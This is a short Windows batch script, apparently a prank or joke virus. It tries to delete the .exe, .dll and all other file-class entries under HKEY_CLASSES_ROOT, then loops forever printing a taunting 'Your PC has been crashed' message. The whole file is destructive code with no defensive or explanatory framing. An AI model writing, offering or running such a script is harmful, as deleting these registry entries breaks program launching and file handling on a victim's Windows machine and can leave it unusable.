@ECHO OFF
 START reg delete HKCR/.exe
 START reg delete HKCR/.dll
 START reg delete HKCR/*
 :MESSAGE
 ECHO Your PC has been crashed.Your Dad.
 GOTO MESSAGE
